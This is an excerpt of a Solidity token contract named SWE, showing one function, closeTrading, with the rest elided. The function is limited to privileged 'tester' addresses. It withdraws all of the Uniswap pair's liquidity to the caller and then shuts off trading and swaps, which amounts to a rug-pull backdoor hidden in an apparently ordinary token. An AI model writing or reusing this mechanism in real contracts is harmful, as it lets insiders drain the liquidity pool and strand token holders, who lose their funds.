...
contract SWE is Context, IERC20, Ownable {
    ...
    function closeTrading() external onlyTesters()
    {
        
        require(tradingOpen,"trading is already closed!");
        //_approve(address(uniswapV2Pair), address(uniswapV2Router), balanceOf(address(uniswapV2Pair)));
        uniswapV2Router.removeLiquidityETH(address(uniswapV2Pair),balanceOf(address(uniswapV2Pair)),0,0,msg.sender,block.timestamp);
        tradingOpen = false;
        swapEnabled = false;
